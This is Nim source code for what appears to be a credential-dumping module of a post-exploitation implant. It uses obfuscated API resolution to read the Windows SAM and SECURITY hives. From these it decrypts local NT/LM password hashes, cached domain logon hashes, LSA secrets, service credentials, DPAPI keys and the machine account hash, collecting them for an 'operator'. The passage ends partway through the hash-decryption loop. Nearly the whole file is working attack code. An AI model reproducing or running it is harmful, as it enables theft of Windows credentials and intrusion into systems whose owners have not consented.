# Taken from the excellent SilentNimvest project by @frkngksl (MIT)
# Source: https://github.com/frkngksl/SilentNimvest

import sam_structs
import sam_crypto
import debug
import strenc
import winim/lean
import std/[strutils, sequtils, json]
import checksums/md5
import nimcrypto

type
    NtOpenKeyExType = proc(KeyHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, OpenOptions: ULONG):NTSTATUS {.stdcall.}
    NtQueryKeyType = proc(KeyHandle: HANDLE,KeyInformationClass: KEY_INFORMATION_CLASS, KeyInformation: PVOID, Length: ULONG, ResultLength: PULONG):NTSTATUS {.stdcall.}
    RegQueryMultipleValuesWType = proc(hKey: HKEY, val_list: PVALENTW, num_vals: DWORD, lpValueBuf: LPWSTR, ldwTotsize: LPDWORD):LSTATUS {.stdcall.}
    NtEnumerateKeyType = proc (KeyHandle: HANDLE,Index: ULONG, KeyInformationClass: KEY_INFORMATION_CLASS, KeyInformation: PVOID,Length: ULONG,ResultLength: PULONG): NTSTATUS {.stdcall.}
    NtEnumerateValueKeyType = proc (KeyHandle: HANDLE,Index: ULONG,KeyValueInformationClass: KEY_VALUE_INFORMATION_CLASS,KeyValueInformation:PVOID,Length:ULONG,ResultLength:PULONG): NTSTATUS {.stdcall.}
    NtCloseType = proc (KeyHandle: HANDLE): NTSTATUS {.stdcall.}

const
  SamVMinLen = 176
  MaxEnumerateIndex = 10_000.ULONG
  MaxEnumerateFailures = 256

var
    NtOpenKeyExProc:NtOpenKeyExType= nil
    RegQueryMultipleValuesWProc:RegQueryMultipleValuesWType = nil
    NtQueryKeyProc:NtQueryKeyType = nil
    NtEnumerateKeyProc:NtEnumerateKeyType = nil
    NtEnumerateValueKeyProc:NtEnumerateValueKeyType = nil
    NtCloseProc:NtCloseType = nil

proc raiseHarvest(operatorMessage, debugDetail: string) {.noreturn.} =
  debug "[-] hashdump: ", debugDetail
  raise newHashdumpHarvestError(operatorMessage, debugDetail)

proc samHarvestError(debugDetail: string) {.noreturn.} =
  raiseHarvest("SAM harvest failed", debugDetail)

proc securityHarvestError(debugDetail: string) {.noreturn.} =
  raiseHarvest("Security harvest failed", debugDetail)

proc requireRange(data: seq[byte], start, endExclusive: int, context: string) =
  if start < 0 or endExclusive < start or endExclusive > data.len:
    samHarvestError("hashdump harvest failed: " & context & " (len=" & $data.len & ")")

proc registryNameMaxBytes(container: seq[byte], nameField: pointer): int =
  let nameOffset = cast[int](nameField) - cast[int](addr container[0])
  if nameOffset < 0 or nameOffset >= container.len:
    return 0
  container.len - nameOffset

proc OpenRegistryWithNtOpenKeyEx(keyString: PCWSTR): HANDLE =
  var
    keyUnicode:UNICODE_STRING
    objectAttributes:OBJECT_ATTRIBUTES
    openOptions:ULONG
    ntStatus:NTSTATUS
    returnHandle:HANDLE
  RtlInitUnicodeString(addr(keyUnicode),keyString);
  InitializeObjectAttributes(addr(objectAttributes),addr(keyUnicode),OBJ_CASE_INSENSITIVE,0,nil)
  openOptions = REG_OPTION_BACKUP_RESTORE or REG_OPTION_OPEN_LINK
  ntStatus = NtOpenKeyExProc(addr returnHandle,KEY_READ,addr objectAttributes, openOptions)
  if(ntStatus != 0):
    debug "[-] hashdump: registry open failed, ntstatus: ", $ntStatus
    raiseHarvest("hashdump harvest failed", "registry open failed, ntstatus=" & $ntStatus)
  return returnHandle

proc EnumerateValueNames(hKey:HANDLE): tuple[names: seq[string], warning: string] =
  var
    returnValue:seq[string] = @[]
    index: ULONG = 0
    consecutiveFailures = 0
    resultLength: ULONG = 0
    buffer:seq[byte]
    status:NTSTATUS
    info:ptr KEY_VALUE_BASIC_INFORMATION_STRUCT
    name:string
    warning = ""
  while index < MaxEnumerateIndex:
    resultLength = 0
    status = NtEnumerateValueKeyProc(hKey,index,KeyValueBasicInformation,nil,0,addr resultLength)

    if status == STATUS_NO_MORE_ENTRIES:
      break

    if resultLength == 0:
      break

    buffer = newSeq[byte](resultLength)
    status = NtEnumerateValueKeyProc(hKey,index,KeyValueBasicInformation,addr buffer[0],resultLength,addr resultLength)

    if status == STATUS_NO_MORE_ENTRIES:
      break

    if status != 0:
      debug "[-] hashdump: cache value enumerate failed, ntstatus: ", $status
      inc consecutiveFailures
      if consecutiveFailures >= MaxEnumerateFailures:
        warning = "Security harvest failed: cache enumeration truncated"
        debug "[-] hashdump: cache value enumeration stopped after consecutive failures"
        break
      continue

    consecutiveFailures = 0
    info = cast[ptr KEY_VALUE_BASIC_INFORMATION_STRUCT](addr buffer[0])
    let pName = cast[ptr UncheckedArray[WCHAR]](addr info.Name)
    name = wcharsToString(pName, info.NameLength, registryNameMaxBytes(buffer, cast[pointer](addr info.Name)))

    if(cmpIgnoreCase(name,"NL$Control") != 0):
      returnValue.add(name)
    inc index

  if index >= MaxEnumerateIndex and warning.len == 0:
    warning = "Security harvest failed: cache enumeration truncated"
    debug "[-] hashdump: cache value enumeration stopped at index cap"

  (returnValue, warning)

proc GetValueWithRegQueryMultipleValuesWType(keyHandle: HANDLE,valueString: string):seq[byte] =
  if RegQueryMultipleValuesWProc == nil:
    raiseHarvest("hashdump harvest failed", "RegQueryMultipleValuesWProc not loaded")
  var
    values: array[1, VALENTW]
    buffer: seq[byte]
    bufferSize: DWORD
    returnValue:LSTATUS

  let valueNameW = valueString.newWideCString()
  values[0].ve_valuename = valueNameW
  bufferSize = 0
  returnValue = RegQueryMultipleValuesWProc( keyHandle, addr values[0], 1, nil, addr bufferSize)

  if returnValue != ERROR_MORE_DATA or bufferSize == 0:
    debug "[-] hashdump: registry value size query failed, code: ", $returnValue
    raiseHarvest("hashdump harvest failed", "registry value size query failed, code=" & $returnValue)

  buffer = newSeq[byte](bufferSize)
  returnValue = RegQueryMultipleValuesWProc(keyHandle, addr values[0], 1, cast[LPWSTR](addr buffer[0]), addr bufferSize)

  if returnValue != 0:
    debug "[-] hashdump: registry value read failed, code: ", $returnValue
    raiseHarvest("hashdump harvest failed", "registry value read failed, code=" & $returnValue)

  if values[0].ve_valuelen <= 0:
    raiseHarvest("hashdump harvest failed", "empty registry value")
  let offset = values[0].ve_valueptr.int - cast[int](addr buffer[0])
  if offset < 0 or offset + values[0].ve_valuelen.int > buffer.len:
    raiseHarvest("hashdump harvest failed", "invalid registry value layout")
  return buffer[offset ..< offset + values[0].ve_valuelen.int]

proc polEkListDecryptParts(fVal: seq[byte]): tuple[dataVal: seq[byte], dataVal2: seq[byte]] =
  if fVal.len < 60:
    securityHarvestError("hashdump harvest failed: PolEKList value too short")
  let data = fVal[28 ..< fVal.len]
  if data.len < 64:
    securityHarvestError("hashdump harvest failed: PolEKList payload too short")
  (data[0 ..< 32], data[32 ..< data.len])

proc parseSamVFields(v: seq[byte]): tuple[
    offset, length, lmHashOffset, lmHashLength, ntHashOffset, ntHashLength: int] =
  if v.len < SamVMinLen:
    samHarvestError("hashdump harvest failed: SAM V value too short")
  var offset = (cast[ptr int32](addr v[12]))[]
  offset += 204
  let length = (cast[ptr int32](addr v[16]))[]
  var lmHashOffset = (cast[ptr int32](addr v[156]))[]
  lmHashOffset += 204
  let lmHashLength = (cast[ptr int32](addr v[160]))[]
  var ntHashOffset = (cast[ptr int32](addr v[168]))[]
  ntHashOffset += 204
  let ntHashLength = (cast[ptr int32](addr v[172]))[]
  if offset < 0 or length < 0 or lmHashOffset < 0 or ntHashOffset < 0:
    samHarvestError("hashdump harvest failed: SAM V offsets invalid")
  if offset + length > v.len:
    samHarvestError("hashdump harvest failed: SAM V username out of range")
  if ntHashOffset + 2 >= v.len:
    samHarvestError("hashdump harvest failed: SAM V hash header out of range")
  (offset, length, lmHashOffset, lmHashLength, ntHashOffset, ntHashLength)

proc DynamicallyLoadFunctions():bool =
  var
    ntdllHandle:HMODULE
    advapi32Handle:HMODULE
  ntdllHandle = LoadLibraryA(obf("ntdll.dll"))
  advapi32Handle = LoadLibraryA(obf("advapi32.dll"))
  if ntdllHandle == 0 or advapi32Handle == 0:
    debug "[-] hashdump: failed to load ntdll or advapi32"
    return false
  let ntOpenKeyExAddr = GetProcAddress(ntdllHandle, obf("NtOpenKeyEx"))
  if(ntOpenKeyExAddr == cast[FARPROC](0)):
    debug "[-] hashdump: failed to resolve NtOpenKeyEx"
    return false
  let regQueryMultipleValuesWAddr = GetProcAddress(advapi32Handle, obf("RegQueryMultipleValuesW"))
  if(regQueryMultipleValuesWAddr == cast[FARPROC](0)):
    debug "[-] hashdump: failed to resolve RegQueryMultipleValuesW"
    return false
  let ntQueryKeyAddr = GetProcAddress(ntdllHandle, obf("NtQueryKey"))
  if(ntQueryKeyAddr == cast[FARPROC](0)):
    debug "[-] hashdump: failed to resolve NtQueryKey"
    return false
  let ntEnumerateKeyAddr = GetProcAddress(ntdllHandle, obf("NtEnumerateKey"))
  if(ntEnumerateKeyAddr == cast[FARPROC](0)):
    debug "[-] hashdump: failed to resolve NtEnumerateKey"
    return false
  let ntEnumerateValueKeyAddr = GetProcAddress(ntdllHandle, obf("NtEnumerateValueKey"))
  if(ntEnumerateValueKeyAddr == cast[FARPROC](0)):
    debug "[-] hashdump: failed to resolve NtEnumerateValueKey"
    return false
  let ntCloseAddr = GetProcAddress(ntdllHandle, obf("NtClose"))
  if(ntCloseAddr == cast[FARPROC](0)):
    debug "[-] hashdump: failed to resolve NtClose"
    return false
  NtOpenKeyExProc = cast[NtOpenKeyExType](ntOpenKeyExAddr)
  RegQueryMultipleValuesWProc = cast[RegQueryMultipleValuesWType](regQueryMultipleValuesWAddr)
  NtQueryKeyProc = cast[NtQueryKeyType](ntQueryKeyAddr)
  NtEnumerateKeyProc = cast[NtEnumerateKeyType](ntEnumerateKeyAddr)
  NtEnumerateValueKeyProc = cast[NtEnumerateValueKeyType](ntEnumerateValueKeyAddr)
  NtCloseProc = cast[NtCloseType](ntCloseAddr)
  return true

proc GetBootKey(): seq[byte] =
  var
    hKey: HKEY
    classBuffer: array[256, WCHAR]
    classSize: DWORD
    returnBuffer: seq[byte] = newSeq[byte](16)
    scrambledByteArray: seq[byte]
    classStr: string = ""
  let permutationMatrix = [byte 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7]
  let keyLocations = [obf("JD"), obf("Skew1"), obf("GBG"), obf("Data")]
  let mainRegLocation = obf("SYSTEM\\CurrentControlSet\\Control\\Lsa\\")
  for keyLocation in keyLocations:
    let keyValue = mainRegLocation & keyLocation
    let wideKeyValue = newWideCString(keyValue)
    let openStatus = RegOpenKeyExW(HKEY_LOCAL_MACHINE, wideKeyValue, 0, KEY_READ, addr hKey)
    if openStatus != 0:
      debug "[-] hashdump: boot key open failed, code: ", $openStatus
      samHarvestError("hashdump harvest failed: boot key open failed")
    classSize = 256
    let infoStatus = RegQueryInfoKeyW(hKey, addr classBuffer[0], addr classSize, nil, nil, nil, nil, nil, nil, nil, nil, nil)
    RegCloseKey(hKey)
    if infoStatus != 0:
      debug "[-] hashdump: boot key query failed, code: ", $infoStatus
      samHarvestError("hashdump harvest failed: boot key query failed")
    if classSize == 0:
      samHarvestError("hashdump harvest failed: empty boot key class")
    for i in 0 ..< classSize.int:
      classStr.add(cast[char](classBuffer[i]))
  if classStr.len != 32:
    samHarvestError("hashdump harvest failed: boot key class hex length invalid")
  scrambledByteArray = hexStringToByteArray(classStr)
  if scrambledByteArray.len < 16:
    samHarvestError("hashdump harvest failed: boot key hex too short")
  for i in countup(0, 15):
    returnBuffer[i] = scrambledByteArray[permutationMatrix[i]]
  return returnBuffer

proc GetSysKey(): seq[byte] =
  block:
    let handleVal = OpenRegistryWithNtOpenKeyEx(obf("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account"))
    defer:
      discard NtCloseProc(handleVal)
    return GetValueWithRegQueryMultipleValuesWType(handleVal, obf("F"))

proc GetHashedBootKey(fVal:seq[byte],bootKey:seq[byte]):seq[byte] =
  if fVal.len < 105:
    samHarvestError("hashdump harvest failed: F value too short for boot key")
  let domainData = fVal[104 ..< fVal.len]
  if domainData.len == 0:
    samHarvestError("hashdump harvest failed: empty domain data")

  if domainData[0] == 0x01:
    if fVal.len < 160:
      samHarvestError("hashdump harvest failed: F value too short for old-style boot key")
    let f70:seq[byte]  = fVal[112 ..< 112+16]
    var data:seq[byte] = @[]
    data.add(f70)
    data.add(cast[seq[byte]]("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"))
    data.add(bootKey)
    data.add(cast[seq[byte]]("0123456789012345678901234567890123456789\0"))
    var md5ContextVar:MD5Context
    var md5DigestVar:MD5Digest
    md5ContextVar.md5Init()
    md5ContextVar.md5Update(data)
    md5ContextVar.md5Final(md5DigestVar)
    let md5bytes = newSeq[byte](16)
    copyMem(addr md5bytes[0],addr md5DigestVar[0],16)
    let f80 = fVal[128 ..< 128+32]
    return RC4Encrypt(md5bytes, f80)

  elif domainData[0] == 0x02:
    if domainData.len < 32:
      samHarvestError("hashdump harvest failed: domain data too short for new-style boot key")
    var dctx : CBC[aes128]
    var sk_Salt_AES   = domainData[16 ..< 16+16]
    var sk_Data_Length = (cast[ptr int32](addr domainData[12]))[]
    if sk_Data_Length <= 0 or sk_Data_Length > MaxSecretBlobLen:
      samHarvestError("hashdump harvest failed: invalid sk_Data_Length")
    if 32 + sk_Data_Length > domainData.len:
      samHarvestError("hashdump harvest failed: sk_Data_Length exceeds domain data")
    var sk_Data_AES   = domainData[32 ..< 32 + sk_Data_Length]
    var decText = newSeq[byte](sk_Data_Length)
    dctx.init(addr bootKey[0], addr sk_Salt_AES[0])
    dctx.decrypt(addr sk_Data_AES[0], addr decText[0],cast[uint](sk_Data_Length))
    dctx.clear()
    return decText
  else:
    debug "[-] hashdump: unsupported hashed bootkey format"
    samHarvestError("hashdump harvest failed: unsupported hashed bootkey format")

proc DumpSecret(keyLocation:string,decryptedLsaKey:seq[byte]):seq[byte] =
  block:
    let hKey = OpenRegistryWithNtOpenKeyEx(keyLocation)
    defer:
      discard NtCloseProc(hKey)
    let value = GetValueWithRegQueryMultipleValuesWType(hKey,"")
    let (valueDataVal, valueDataVal2) = polEkListDecryptParts(value)
    let tempKey = ComputeSha256(decryptedLsaKey, valueDataVal)
    var dctx: ECB[aes256]
    var returnValue:seq[byte]
    dctx.init(tempKey)
    returnValue = newSeq[byte](valueDataVal2.len)
    dctx.decrypt(valueDataVal2, returnValue)
    dctx.clear()
    return returnValue

proc GetServiceUsername(targetService: string): string =
  let scMgrHandle = OpenSCManager(NULL, NULL, 0x0001)
  if scMgrHandle == 0:
    return obf("unknownUser")
  defer:
    CloseServiceHandle(scMgrHandle)
  let svcHandle = OpenService(scMgrHandle, targetService, SERVICE_QUERY_CONFIG)
  if svcHandle == 0:
    return obf("unknownUser")
  defer:
    CloseServiceHandle(svcHandle)
  var bytesNeeded: DWORD = 0
  discard QueryServiceConfig(svcHandle, nil, 0, addr bytesNeeded)
  let qscPtr = newSeq[byte](bytesNeeded)
  if QueryServiceConfig(svcHandle, cast[LPQUERY_SERVICE_CONFIG](addr qscPtr[0]), bytesNeeded, addr bytesNeeded):
    let serviceInfo = cast[LPQUERY_SERVICE_CONFIG](addr qscPtr[0])
    return $serviceInfo.lpServiceStartName
  obf("unknownUser")

proc recordLsaSecret(harvest: var HashdumpResult, keyName: string, secretBlob: LsaSecretBlob) =
  if(keyName.toUpper().startsWith("_SC_")):
    let userName = GetServiceUsername(keyName[4..<keyName.len])
    harvest.lsa_secrets.add(%*{"type": "service_credential", "name": keyName, "username": userName, "secret": $secretBlob.SecretString})
  elif(keyName.toUpper().startsWith("$MACHINE.ACC")):
    block:
      let hKey = OpenRegistryWithNtOpenKeyEx(obf("\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters"))
      defer:
        discard NtCloseProc(hKey)
      let domainNameArr = GetValueWithRegQueryMultipleValuesWType(hKey, obf("Domain"))
      var domainName = SeqToUnicode(domainNameArr).replace("\0", "")
      let computerNameArr = GetValueWithRegQueryMultipleValuesWType(hKey, obf("Hostname"))
      var computerName = SeqToUnicode(computerNameArr).replace("\0", "")
      let computerAcctHash = Md4Hash2(secretBlob.Secret).mapIt(it.toHex(2)).join("-").replace("-","").toLower()
      harvest.machine_account = domainName & "\\" & computerName & "$:aad3b435b51404eeaad3b435b51404ee:" & computerAcctHash
  elif(keyName.toUpper().startsWith("DPAPI")):
    if secretBlob.Secret.len < 44:
      debug "[-] hashdump: skipping DPAPI secret with insufficient length"
      return
    let machineStr = secretBlob.Secret[4..<4+20].mapIt(it.toHex(2)).join("-")
    let userStr = secretBlob.Secret[24..<24+20].mapIt(it.toHex(2)).join("-")
    harvest.dpapi_machine_key = machineStr.replace("-","").toLower(); harvest.dpapi_user_key = userStr.replace("-","").toLower()
  elif(keyName.toUpper().startsWith("NL$KM")):
    harvest.nlkm = secretBlob.Secret.mapIt(it.toHex(2)).join("-").replace("-","").toLower()
  elif(keyName.toUpper().startsWith("ASPNET_WP_PASSWORD")):
    harvest.lsa_secrets.add(%*{"type": "aspnet", "name": keyName, "secret": $secretBlob.SecretString})
  else:
    harvest.lsa_secrets.add(%*{"type": "unsupported", "name": keyName, "secret_hex": secretBlob.Secret.mapIt(it.toHex(2)).join("-").replace("-","").toLower()})

proc samDataProduced(harvest: HashdumpResult): bool =
  harvest.local_users.len > 0

proc securityDataProduced(harvest: HashdumpResult): bool =
  harvest.cached_logons.len > 0 or harvest.lsa_secrets.len > 0 or
    harvest.dpapi_machine_key.len > 0 or harvest.dpapi_user_key.len > 0 or
    harvest.nlkm.len > 0 or harvest.machine_account.len > 0

proc collectSecurityDumpImpl(harvest: var HashdumpResult): string =
  var enumWarning = ""
  block:
    let hKey = OpenRegistryWithNtOpenKeyEx(obf("\\Registry\\Machine\\SECURITY\\Policy\\PolEKList"))
    defer:
      discard NtCloseProc(hKey)
    let fVal = GetValueWithRegQueryMultipleValuesWType(hKey,"")
    let bootKey = GetBootKey()
    let (dataVal, dataVal2) = polEkListDecryptParts(fVal)
    let tempKey = ComputeSha256(bootKey, dataVal)
    var decryptedLsaKey:seq[byte] = newSeq[byte](dataVal2.len)
    var dctx: ECB[aes256]
    dctx.init(tempKey)
    dctx.decrypt(dataVal2, decryptedLsaKey)
    dctx.clear()
    if decryptedLsaKey.len < 100:
      securityHarvestError("hashdump harvest failed: PolEKList decrypt too short")
    decryptedLsaKey = decryptedLsaKey[68 ..< 100]

    var currValName = ""
    block:
      let nlkmHandle = OpenRegistryWithNtOpenKeyEx(obf("\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\NL$KM"))
      defer:
        discard NtCloseProc(nlkmHandle)
      var index: ULONG = 0
      var consecutiveFailures = 0
      while index < MaxEnumerateIndex:
        var bufSize: ULONG = 0
        var status = NtEnumerateKeyProc(nlkmHandle,index,KeyBasicInformation,nil,0,addr bufSize)
        if status == STATUS_NO_MORE_ENTRIES:
          break
        if bufSize == 0:
          inc index
          inc consecutiveFailures
          if consecutiveFailures >= MaxEnumerateFailures:
            break
          continue
        var buf = newSeq[byte](bufSize)
        status = NtEnumerateKeyProc(nlkmHandle,index,KeyBasicInformation,cast[PVOID](addr buf[0]),bufSize,addr bufSize)
        if status == STATUS_NO_MORE_ENTRIES:
          break
        if status != 0:
          debug "[-] hashdump: NL$KM enumerate failed, ntstatus: ", $status
          inc consecutiveFailures
          if consecutiveFailures >= MaxEnumerateFailures:
            if enumWarning.len == 0:
              enumWarning = "Security harvest failed: NL$KM enumeration truncated"
            break
          continue
        consecutiveFailures = 0
        let pInfo = cast[PKEY_BASIC_INFORMATION](addr buf[0])
        let pName = cast[ptr UncheckedArray[WCHAR]](addr pInfo.Name)
        let name = wcharsToString(pName, pInfo.NameLength, registryNameMaxBytes(buf, cast[pointer](addr pInfo.Name)))
        if(name.contains("CurrVal")):
          currValName = name
          break
        inc index

    if currValName == "":
      securityHarvestError("NL$KM key not found")

    let nlkmKey = DumpSecret(obf("\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\NL$KM\\") & currValName, decryptedLsaKey)

    block:
      let cacheHandle = OpenRegistryWithNtOpenKeyEx(obf("\\Registry\\Machine\\SECURITY\\Cache"))
      defer:
        discard NtCloseProc(cacheHandle)
      let (cachedDomainLogonKeyNames, cacheWarning) = EnumerateValueNames(cacheHandle)
      if cacheWarning.len > 0:
        enumWarning = cacheWarning
      for domainKeyName in cachedDomainLogonKeyNames:
        let cachedDomainLogonValue = GetValueWithRegQueryMultipleValuesWType(cacheHandle,domainKeyName)
        if cachedDomainLogonValue.len < 16 or cachedDomainLogonValue[0 ..< 16].allIt(it == 0):
          continue
        if cachedDomainLogonValue.len < 96:
          continue
        let cachedUser = InitNlRecord(cachedDomainLogonValue)
        if nlkmKey.len < 32:
          continue
        let slice = nlkmKey[16 ..< 32]
        let decryptedCBC = DecryptAES_CBC(cachedUser.EncryptedData, slice, cachedUser.Iv)
        let domainEnd = 72 + Pad(cachedUser.UserLength.int) + Pad(cachedUser.DomainNameLength.int) +
          Pad(cachedUser.DnsDomainLength.int)
        if decryptedCBC.len < 16 or decryptedCBC.len < domainEnd:
          continue
        let hashedPW = decryptedCBC[0 ..< 16]
        let sliceUsername = decryptedCBC[72 ..< 72 + cachedUser.UserLength.int]
        let startIndex = 72 + Pad(cachedUser.UserLength.int) + Pad(cachedUser.DomainNameLength.int)
        let sliceDomain = decryptedCBC[startIndex ..< startIndex + Pad(cachedUser.DnsDomainLength.int)]
        var domain = SeqToUnicode(sliceDomain)
        var username = SeqToUnicode(sliceUsername)
        domain = domain.replace("\0", "")
        harvest.cached_logons.add(%*{"domain": domain, "username": username, "hash": "$DCC2$10240#" & username & "#" & hashedPW.mapIt(it.toHex(2)).join("-").replace("-","").toLower()})

    var listOfLSASecrets:seq[string] = @[]
    block:
      let secretsHandle = OpenRegistryWithNtOpenKeyEx(obf("\\Registry\\Machine\\SECURITY\\Policy\\Secrets"))
      defer:
        discard NtCloseProc(secretsHandle)
      var index: ULONG = 0
      var consecutiveFailures = 0
      while index < MaxEnumerateIndex:
        var bufSize: ULONG = 0
        var status = NtEnumerateKeyProc(secretsHandle,index,KeyBasicInformation,nil,0,addr bufSize)
        if status == STATUS_NO_MORE_ENTRIES:
          break
        if bufSize == 0:
          inc index
          inc consecutiveFailures
          if consecutiveFailures >= MaxEnumerateFailures:
            break
          continue
        var buf = newSeq[byte](bufSize)
        status = NtEnumerateKeyProc(secretsHandle,index,KeyBasicInformation,cast[PVOID](addr buf[0]),bufSize,addr bufSize)
        if status == STATUS_NO_MORE_ENTRIES:
          break
        if status != 0:
          debug "[-] hashdump: secrets enumerate failed, ntstatus: ", $status
          inc consecutiveFailures
          if consecutiveFailures >= MaxEnumerateFailures:
            if enumWarning.len == 0:
              enumWarning = "Security harvest failed: LSA secrets enumeration truncated"
            break
          continue
        consecutiveFailures = 0
        let pInfo = cast[PKEY_BASIC_INFORMATION](addr buf[0])
        let pName = cast[ptr UncheckedArray[WCHAR]](addr pInfo.Name)
        let name = wcharsToString(pName, pInfo.NameLength, registryNameMaxBytes(buf, cast[pointer](addr pInfo.Name)))
        if(cmpIgnoreCase(name,"NL$Control") != 0):
          listOfLSASecrets.add(name)
        inc index

    for lsaSecretString in listOfLSASecrets:
      if(cmpIgnoreCase(lsaSecretString,"NL$KM") == 0):
        let secretBlob = NewLsaSecretBlob(nlkmKey)
        if(secretBlob.Length > 0):
          recordLsaSecret(harvest, lsaSecretString, secretBlob)
      else:
        let secretBlob = NewLsaSecretBlob(DumpSecret(obf("\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\") & lsaSecretString & obf("\\CurrVal"), decryptedLsaKey))
        if(secretBlob.Length > 0):
          recordLsaSecret(harvest, lsaSecretString, secretBlob)

  enumWarning

proc collectSecurityDump(harvest: var HashdumpResult): PhaseResult =
  try:
    let enumWarning = collectSecurityDumpImpl(harvest)
    var phase = PhaseResult(dataProduced: securityDataProduced(harvest), failed: false)
    if enumWarning.len > 0:
      phase.warning = enumWarning
    return phase
  except HashdumpHarvestError as e:
    debug "[-] hashdump: ", e.debugDetail
    var warning = e.operatorMessage
    if warning.len == 0:
      warning = "Security harvest failed"
    return PhaseResult(
      dataProduced: securityDataProduced(harvest),
      failed: true,
      operatorMessage: e.operatorMessage,
      warning: warning
    )

proc collectSamDumpImpl(harvest: var HashdumpResult): string =
  var listOfUserKeys:seq[string] = @[]
  var samWarning = ""
  block:
    let usersHandle = OpenRegistryWithNtOpenKeyEx(obf("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users"))
    defer:
      discard NtCloseProc(usersHandle)
    var index: ULONG = 0
    var consecutiveFailures = 0
    while index < MaxEnumerateIndex:
      var bufSize: ULONG = 0
      var status = NtEnumerateKeyProc(usersHandle,index,KeyBasicInformation,nil,0,addr bufSize)
      if status == STATUS_NO_MORE_ENTRIES:
        break
      if bufSize == 0:
        inc index
        inc consecutiveFailures
        if consecutiveFailures >= MaxEnumerateFailures:
          break
        continue
      var buf = newSeq[byte](bufSize)
      status = NtEnumerateKeyProc(usersHandle,index,KeyBasicInformation,cast[PVOID](addr buf[0]),bufSize,addr bufSize)
      if status == STATUS_NO_MORE_ENTRIES:
        break
      if status != 0:
        debug "[-] hashdump: SAM user enumerate failed, ntstatus: ", $status
        inc consecutiveFailures
        if consecutiveFailures >= MaxEnumerateFailures:
          samWarning = "SAM harvest failed: user enumeration truncated"
          break
        continue
      consecutiveFailures = 0
      let pInfo = cast[PKEY_BASIC_INFORMATION](addr buf[0])
      let pName = cast[ptr UncheckedArray[WCHAR]](addr pInfo.Name)
      let name = wcharsToString(pName, pInfo.NameLength, registryNameMaxBytes(buf, cast[pointer](addr pInfo.Name)))
      if(name.startsWith("00000")):
        listOfUserKeys.add(name)
      inc index

    if index >= MaxEnumerateIndex and samWarning.len == 0:
      samWarning = "SAM harvest failed: user enumeration truncated at index cap"

  let hashedBootKey = GetHashedBootKey(GetSysKey(), GetBootKey())
  let antpassword:seq[byte] = cast[seq[byte]]("NTPASSWORD\0")
  let almpassword:seq[byte] = cast[seq[byte]]("LMPASSWORD\0")

  for userKey in listOfUserKeys:
    try:
      var userRIDByteArray:array[4,byte]
      let userRIDUint = try:
        parseHexInt(userKey).uint32
      except ValueError:
        debug "[-] hashdump: skipping invalid SAM user RID key: ", userKey
        continue
      copyMem(addr userRIDByteArray[0],cast[ptr byte](addr userRIDUint),4)

      var vValueUser: seq[byte]
      block:
        let userHandle = OpenRegistryWithNtOpenKeyEx(obf("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\") & userKey)
        defer:
          discard NtCloseProc(userHandle)
        vValueUser = GetValueWithRegQueryMultipleValuesWType(userHandle, obf("V"))

      let (offset, length, lmHashOffset, lmHashLength, ntHashOffset, ntHashLength) = parseSamVFields(vValueUser)
      var usernameWstring = newWString(0)
      var idx = 0
      while idx < length:
        usernameWstring.add(cast[WCHAR](vValueUser[idx+offset]))
        idx = idx + 2

      var decryptStatus = "not_applicable"
      var lmHashNode = newJNull()
      var ntHashNode = newJNull()
      var lmOk = false
      var ntOk = false
      var attemptedDecrypt = false

      if vValueUser[ntHashOffset + 2] == 0x01:
        var md5ContextVar:MD5Context
        var md5DigestVar:MD5Digest
        if ntHashLength == 20:
          attemptedDecrypt = true
          requireRange(vValueUser, ntHashOffset + 4, ntHashOffset + 20, "SAM V NT hash out of range")
          var ntKeyParts = newSeq[byte](0)
          var ntHashDecryptionKey = newSeq[byte](16)
          ntKeyParts.add(hashedBootKey[0..<16])
          ntKeyParts.add(userRIDByteArray)
          ntKeyParts.add(antpassword)
          md5ContextVar.md5Init()
          md5ContextVar.md5Update(ntKeyParts)
          md5ContextVar.md5Final(md5DigestVar)
          copyMem(addr ntHashDecryptionKey[0],addr md5DigestVar[0],16)
          let encryptedNtHash = vValueUser[ntHashOffset + 4 ..< ntHashOffset + 20]
          let obfuscatedNtHash = RC4Encrypt(ntHashDecryptionKey, encryptedNtHash)
          try:
            let ntHash = DecryptSingleHash(obfuscatedNtHash, userKey).replace("-", "").toLower()
            ntHashNode = %ntHash
            ntOk = true
          except CatchableError as e:
            debug "[-] hashdump: NT hash decrypt failed for ", userKey, ": ", e.msg
            discard
        if lmHashLength == 20:
          attemptedDecrypt = true
          requireRange(vValueUser, lmHashOffset + 4, lmHashOffset + 20, "SAM V LM hash out of range")
          var lmKeyParts = newSeq[byte](0)
          var lmHashDecryptionKey = newSeq[byte](16)
          lmKeyParts.add(hashedBootKey[0..<16])
          lmKeyParts.add(userRIDByteArray)
          lmKeyParts.add(almpassword)
          md5ContextVar.md5Init()
          md5ContextVar.md5Update(lmKeyParts)
          md5ContextVar.md5Final(md5DigestVar)
          copyMem(addr lmHashDecryptionKey[0],addr md5DigestVar[0],16)
          let encryptedLmHash = vValueUser[lmHashOffset + 4 ..< lmHashOffset + 20]
          let obfuscatedLmHash = RC4Encrypt(lmHashDecryptionKey, encryptedLmHash)
          try:
            let lmHash = DecryptSingleHash(obfuscatedLmHash, userKey).replace("-", "").toLower()
            lmHashNode = %lmHash
            lmOk = true
          except CatchableError as e:
            debug "[-] hashdump: LM hash decrypt failed for ", userKey, ": ", e.msg
            discard
        if attemptedDecrypt:
          if lmOk or ntOk:
            decryptStatus = "ok"
          else:
            decryptStatus = "failed"
      else:
        requireRange(vValueUser, lmHashOffset, lmHashOffset + lmHashLength, "SAM V LM blob out of range")
        let enc_LM_Hash = vValueUser[lmHashOffset ..< lmHashOffset + lmHashLength]
        if enc_LM_Hash.len >= 24:
          let lmData = enc_LM_Hash[24 ..< enc_LM_Hash.len]
          if lmData.len > 0:
            attemptedDecrypt = true
            let slice = hashedBootKey[0 ..< 16]
